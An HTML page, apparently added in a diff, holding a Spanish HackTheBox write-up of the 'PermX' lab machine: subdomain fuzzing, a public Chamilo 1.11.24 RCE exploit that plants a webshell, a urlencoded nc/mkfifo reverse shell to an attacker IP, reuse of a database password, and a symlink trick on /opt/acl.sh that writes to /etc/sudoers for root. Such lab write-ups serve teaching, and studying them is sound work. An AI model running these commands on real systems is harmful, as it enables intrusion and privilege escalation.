@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PermX — Writeup</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;500;700&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c0f;
+    --bg2: #0f1318;
+    --bg3: #141920;
+    --accent: #3b82f6;
+    --accent2: #ff6b35;
+    --accent3: #60a5fa;
+    --text: #c8d6e5;
+    --text-dim: #5a7080;
+    --border: #1e2d3d;
+    --red: #ff4757;
+    --yellow: #ffd32a;
+    --green: #2ecc71;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(59,130,246,0.012) 2px,
+      rgba(59,130,246,0.012) 4px
+    );
+    pointer-events: none;
+    z-index: 999;
+  }
+
+  header {
+    position: relative;
+    padding: 80px 0 60px;
+    text-align: center;
+    border-bottom: 1px solid var(--border);
+    overflow: hidden;
+  }
+
+  header::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background:
+      radial-gradient(ellipse 60% 80% at 50% 0%, rgba(37,99,235,0.12) 0%, transparent 70%),
+      radial-gradient(ellipse 40% 40% at 80% 80%, rgba(59,130,246,0.06) 0%, transparent 60%);
+  }
+
+  .header-tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 4px;
+    color: var(--accent3);
+    text-transform: uppercase;
+    margin-bottom: 16px;
+    opacity: 0.8;
+  }
+
+  h1 {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: clamp(52px, 8vw, 96px);
+    font-weight: 700;
+    letter-spacing: -2px;
+    color: #fff;
+    line-height: 1;
+    position: relative;
+  }
+
+  h1 .glow {
+    color: var(--accent3);
+    text-shadow: 0 0 40px rgba(96,165,250,0.6), 0 0 80px rgba(96,165,250,0.2);
+  }
+
+  .header-meta {
+    margin-top: 24px;
+    display: flex;
+    gap: 12px;
+    justify-content: center;
+    flex-wrap: wrap;
+    position: relative;
+  }
+
+  .tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    padding: 4px 12px;
+    border: 1px solid;
+    letter-spacing: 2px;
+  }
+  .tag.win      { border-color: var(--accent);  color: var(--accent); }
+  .tag.ad       { border-color: var(--accent3); color: var(--accent3); }
+  .tag.asrep    { border-color: var(--yellow);  color: var(--yellow); }
+  .tag.dcsync   { border-color: var(--red);     color: var(--red); }
+
+  .container {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 0 32px;
+  }
+
+  .phase {
+    padding: 64px 0;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .phase-header {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    margin-bottom: 36px;
+  }
+
+  .phase-num {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: 3px;
+    white-space: nowrap;
+    opacity: 0.7;
+  }
+
+  .phase-line {
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, var(--border), transparent);
+  }
+
+  h2 {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 32px;
+    font-weight: 700;
+    color: #fff;
+    letter-spacing: 1px;
+    margin-bottom: 24px;
+  }
+
+  h2 .accent  { color: var(--accent); }
+  h2 .accent2 { color: var(--accent2); }
+  h2 .accent3 { color: var(--accent3); }
+  h2 .yellow  { color: var(--yellow); }
+  h2 .red     { color: var(--red); }
+  h2 .green   { color: var(--green); }
+
+  p {
+    color: var(--text);
+    margin-bottom: 16px;
+    font-weight: 300;
+    font-size: 17px;
+  }
+
+  .code-block {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    padding: 20px 24px;
+    margin: 20px 0;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: #93c5fd;
+    overflow-x: auto;
+    position: relative;
+    line-height: 1.8;
+    white-space: pre;
+  }
+
+  .code-block.cmd    { border-left-color: var(--accent2); color: #f0a080; }
+  .code-block.output { border-left-color: var(--text-dim); color: var(--text-dim); font-size: 12px; }
+  .code-block.bash   { border-left-color: var(--green); color: #a8e6c3; }
+  .code-block.sql    { border-left-color: var(--red); color: #ffb3ba; }
+
+  .code-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 3px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+
+  .finding {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    padding: 20px 24px;
+    margin: 20px 0;
+    position: relative;
+  }
+
+  .finding::before {
+    content: '!';
+    position: absolute;
+    top: -1px;
+    left: -1px;
+    background: var(--accent2);
+    color: #000;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    font-weight: bold;
+    padding: 2px 8px;
+    letter-spacing: 2px;
+  }
+
+  .finding.info::before    { content: 'INFO';           background: var(--accent3);  color: #fff; }
+  .finding.success::before { content: 'PWN';            background: var(--accent);   color: #fff; }
+  .finding.vuln::before    { content: 'VULN';           background: var(--red);      color: #fff; }
+  .finding.explain::before { content: 'CÓMO FUNCIONA';  background: var(--yellow);   color: #000; }
+  .finding.tip::before     { content: 'TIP';            background: var(--green);    color: #000; }
+
+  .finding-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 14px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    margin-bottom: 8px;
+    padding-top: 4px;
+  }
+
+  .ports-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    margin: 20px 0;
+  }
+
+  .ports-table th {
+    text-align: left;
+    color: var(--accent);
+    letter-spacing: 3px;
+    font-size: 10px;
+    padding: 8px 16px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .ports-table td {
+    padding: 10px 16px;
+    border-bottom: 1px solid rgba(30,45,61,0.5);
+    color: var(--text);
+  }
+
+  .ports-table tr:hover td { background: rgba(59,130,246,0.03); }
+  .port-open { color: var(--green); }
+  .port-num  { color: var(--accent2); font-weight: bold; }
+
+  .db-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    margin: 20px 0;
+  }
+
+  .db-table th {
+    text-align: left;
+    color: var(--red);
+    letter-spacing: 2px;
+    font-size: 10px;
+    padding: 8px 16px;
+    border-bottom: 1px solid rgba(255,71,87,0.3);
+    background: rgba(255,71,87,0.04);
+  }
+
+  .db-table td {
+    padding: 10px 16px;
+    border-bottom: 1px solid rgba(30,45,61,0.5);
+    color: var(--text);
+  }
+
+  .db-table tr:hover td { background: rgba(255,71,87,0.03); }
+  .db-highlight { color: var(--yellow); }
+
+  .flag-box {
+    background: rgba(59,130,246,0.04);
+    border: 1px solid rgba(59,130,246,0.25);
+    padding: 16px 24px;
+    margin: 20px 0;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
+
+  .flag-box.key { border-color: rgba(255,211,42,0.3); background: rgba(255,211,42,0.03); }
+
+  .flag-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 3px;
+    color: var(--accent);
+    white-space: nowrap;
+  }
+
+  .flag-box.key .flag-label { color: var(--yellow); }
+
+  .flag-value {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 14px;
+    color: #fff;
+    word-break: break-all;
+  }
+
+  code {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--accent);
+    background: rgba(59,130,246,0.08);
+    padding: 1px 6px;
+  }
+
+  .highlight { color: var(--accent2); }
+
+  .chain { display: flex; flex-direction: column; gap: 0; margin: 32px 0; }
+  .chain-step { display: flex; gap: 20px; align-items: flex-start; }
+
+  .chain-icon {
+    width: 40px;
+    height: 40px;
+    border: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--accent);
+    flex-shrink: 0;
+    background: var(--bg2);
+  }
+
+  .chain-connector {
+    width: 40px;
+    display: flex;
+    justify-content: center;
+    padding: 4px 0;
+    flex-shrink: 0;
+  }
+
+  .chain-connector::before {
+    content: '';
+    width: 1px;
+    height: 100%;
+    background: linear-gradient(180deg, var(--border), transparent);
+    min-height: 20px;
+    display: block;
+  }
+
+  .chain-content { padding-bottom: 24px; }
+
+  .chain-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-weight: 700;
+    font-size: 18px;
+    color: #fff;
+    margin-bottom: 4px;
+  }
+
+  .chain-desc { font-size: 15px; color: var(--text-dim); font-weight: 300; }
+
+  footer { padding: 48px 0; text-align: center; }
+
+  .footer-text {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+  }
+
+  .divider {
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--border), transparent);
+    margin: 8px 0;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <div class="header-tag">// HackTheBox — Writeup</div>
+    <h1>PERM<span class="glow">X</span></h1>
+    <div class="header-meta">
+      <span class="tag win">#linux</span>
+      <span class="tag ad">#chamilo</span>
+      <span class="tag asrep">#rce</span>
+      <span class="tag dcsync">#symlink</span>
+    </div>
+  </div>
+</header>
+
+<main class="container">
+
+  <!-- FASE 1: RECONOCIMIENTO -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 01</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent">RECONOCIMIENTO</span> — Escaneo de puertos</h2>
+
+    <p>Lo primero es hacer un escaneo con <code>nmap</code> para ver a qué nos enfrentamos.</p>
+
+    <div class="code-label">escaneo de puertos</div>
+    <div class="code-block cmd">nmap -p- -T5 10.129.51.254 -oG allPorts</div>
+
+    <table class="ports-table">
+      <thead>
+        <tr>
+          <th>PUERTO</th>
+          <th>ESTADO</th>
+          <th>SERVICIO</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td class="port-num">22/tcp</td><td class="port-open">OPEN</td><td>ssh</td></tr>
+        <tr><td class="port-num">80/tcp</td><td class="port-open">OPEN</td><td>http</td></tr>
+      </tbody>
+    </table>
+
+    <p>Solo hay una web a simple vista. Al entrar, redirige al dominio <code>permx.htb</code>, que se añade al <code>/etc/hosts</code>.</p>
+  </section>
+
+  <!-- FASE 2: ENUMERACIÓN DE SUBDOMINIOS -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 02</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent2">ENUMERACIÓN</span> — Subdominio con Chamilo LMS</h2>
+
+    <p>Tras probar fuzzing de directorios sin resultado, se pasa a enumerar subdominios con <code>ffuf</code>.</p>
+
+    <div class="code-label">fuzzing de subdominios (vhost)</div>
+    <div class="code-block cmd">ffuf -w subdomains.txt -u http://10.129.51.254 -H "Host: FUZZ.permx.htb" -fc 302</div>
+
+    <div class="finding info">
+      <div class="finding-title">Subdominio encontrado</div>
+      Aparece <code>lms.permx.htb</code>, que se añade al <code>/etc/hosts</code>. Al entrar se ve el portal de login de <code>Chamilo</code>, una plataforma LMS (Learning Management System).
+    </div>
+
+    <p>La ruta <code>/documentation/changelog.html</code> revela la versión exacta instalada.</p>
+
+    <div class="finding vuln">
+      <div class="finding-title">Chamilo LMS 1.11.24</div>
+      Con la versión identificada se busca en <code>searchsploit</code> y aparece un exploit de <code>Remote Code Execution (RCE)</code> para esta versión concreta.
+    </div>
+  </section>
+
+  <!-- FASE 3: RCE Y REVERSE SHELL -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 03</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="red">RCE</span> — Chamilo 1.11.24 sin autenticación</h2>
+
+    <p>Se descarga el exploit público y se prueba contra el LMS.</p>
+
+    <div class="code-label">prueba del exploit</div>
+    <div class="code-block cmd">python 52083.py http://lms.permx.htb/ 'id'</div>
+
+    <div class="code-block output">[+] File uploaded successfully!
+[+] Access the shell at: http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php?cmd=
+[+] Command Output:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
+
+    <div class="finding success">
+      <div class="finding-title">Ejecución de comandos confirmada</div>
+      El exploit sube una webshell PHP sin necesidad de autenticación y permite ejecutar comandos como <code>www-data</code>.
+    </div>
+
+    <p>Se usa el mismo exploit para lanzar una reverse shell, con el payload de <code>nc</code> + <code>mkfifo</code> urlencodeado.</p>
+
+    <div class="code-label">payload de reverse shell (urlencoded)</div>
+    <div class="code-block cmd">python 52083.py http://lms.permx.htb/ 'rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.15.51%204444%20%3E%2Ftmp%2Ff'</div>
+
+    <p>Con un listener en el puerto <code>4444</code>, llega la shell como <code>www-data</code>.</p>
+  </section>
+
+  <!-- FASE 4: CREDENCIALES DE BASE DE DATOS -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 04</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="yellow">CREDENCIALES</span> — Config de Chamilo reutilizada</h2>
+
+    <p>Se revisa el fichero de configuración de la aplicación en busca de credenciales.</p>
+
+    <div class="code-label">config.php</div>
+    <div class="code-block cmd">grep 'db_user\|db_password' /var/www/chamilo/app/config/configuration.php</div>
+
+    <div class="code-block output">$_configuration['db_user'] = 'chamilo';
+$_configuration['db_password'] = '03F6lY3uXAP2bkW8';</div>
+
+    <div class="finding vuln">
+      <div class="finding-title">Contraseña reutilizada por un usuario del sistema</div>
+      El único usuario con carpeta propia en <code>/home</code> es <code>mtz</code>. Se prueba la contraseña de la base de datos por si la reutiliza, y funciona.
+    </div>
+
+    <div class="code-label">cambio de usuario</div>
+    <div class="code-block cmd">su mtz
+cat user.txt</div>
+
+    <div class="flag-box key">
+      <span class="flag-label">USER FLAG</span>
+      <span class="flag-value">20e864d5f1e7ceabaeae01995ed01b1c</span>
+    </div>
+  </section>
+
+  <!-- FASE 5: ESCALADA CON ACL.SH -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 05</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="green">SYMLINK</span> — Abuso de /opt/acl.sh</h2>
+
+    <p>Se comprueban los privilegios <code>sudo</code> del usuario.</p>
+
+    <div class="code-label">sudo -l</div>
+    <div class="code-block cmd">sudo -l</div>
+
+    <div class="code-block output">User mtz may run the following commands on permx:
+    (ALL : ALL) NOPASSWD: /opt/acl.sh</div>
+
+    <p>Se puede ejecutar <code>/opt/acl.sh</code> como cualquier usuario sin contraseña. El script solo se puede leer y ejecutar, no modificar.</p>
+
+    <div class="code-label">/opt/acl.sh</div>
+    <div class="code-block output">#!/bin/bash
+if [ "$#" -ne 3 ]; then
+    /usr/bin/echo "Usage: $0 user perm file"
+    exit 1
+fi
+user="$1"; perm="$2"; target="$3"
+
+if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
+    /usr/bin/echo "Access denied."
+    exit 1
+fi
+if [ ! -f "$target" ]; then
+    /usr/bin/echo "Target must be a file."
+    exit 1
+fi
+
+/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"</div>
+
+    <div class="finding vuln">
+      <div class="finding-title">Validación de ruta insuficiente</div>
+      El script concede permisos ACL sobre cualquier fichero que empiece por <code>/home/mtz/</code> y no contenga <code>..</code>, pero no comprueba si esa ruta es un <b>symlink</b> hacia fuera de esa carpeta. Creando un enlace simbólico dentro de <code>/home/mtz/</code> que apunte a <code>/etc/sudoers</code>, el script termina dándonos permisos de escritura sobre el propio <code>/etc/sudoers</code>.
+    </div>
+
+    <p>Como la máquina revierte los cambios al poco tiempo, se automatizan todos los pasos en un único script.</p>
+
+    <div class="code-label">exploit.sh</div>
+    <div class="code-block bash">#!/bin/bash
+ln -sf /etc/sudoers /home/mtz/evil
+sudo /opt/acl.sh mtz rw /home/mtz/evil
+echo "mtz ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
+sudo su</div>
+
+    <p>Se le dan permisos de ejecución y se lanza.</p>
+
+    <div class="code-label">ejecución del exploit</div>
+    <div class="code-block cmd">chmod +x exploit.sh
+./exploit.sh</div>
+
+    <div class="code-block output">root@permx:/home/mtz# whoami
+root</div>
+
+    <div class="code-label">lectura de la flag</div>
+    <div class="code-block cmd">cat /root/root.txt</div>
+
+    <div class="flag-box key">
+      <span class="flag-label">ROOT FLAG</span>
+      <span class="flag-value">00618370d658ed129600eb0abdd2746f</span>
+    </div>
+  </section>
+
+  <!-- RESUMEN -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// RESUMEN</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2>CADENA DE <span class="accent">ATAQUE</span></h2>
+
+    <div class="chain">
+      <div class="chain-step">
+        <div class="chain-icon">01</div>
+        <div class="chain-content">
+          <div class="chain-title">Enumeración — Subdominio LMS</div>
+          <div class="chain-desc">ffuf de vhosts descubre lms.permx.htb → Chamilo LMS 1.11.24</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon">02</div>
+        <div class="chain-content">
+          <div class="chain-title">RCE sin autenticación</div>
+          <div class="chain-desc">Exploit público sube una webshell y ejecuta comandos → reverse shell como www-data</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon">03</div>
+        <div class="chain-content">
+          <div class="chain-title">Credenciales reutilizadas — mtz</div>
+          <div class="chain-desc">La contraseña de la base de datos de Chamilo funciona también para el usuario del sistema mtz → <code>user.txt</code></div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color: var(--green); color: var(--green);">⚡</div>
+        <div class="chain-content">
+          <div class="chain-title" style="color: var(--green);">Symlink en acl.sh → root</div>
+          <div class="chain-desc">/opt/acl.sh valida la ruta pero no resuelve symlinks → un enlace a /etc/sudoers concede escritura sobre él → se añade NOPASSWD:ALL → <code>root.txt</code></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="container">
+    <div class="divider"></div>
+    <br>
+    <div class="footer-text">PERMX // WRITEUP // HACKTHEBOX — CTF</div>
+  </div>
+</footer>
+
+</body>
+</html>
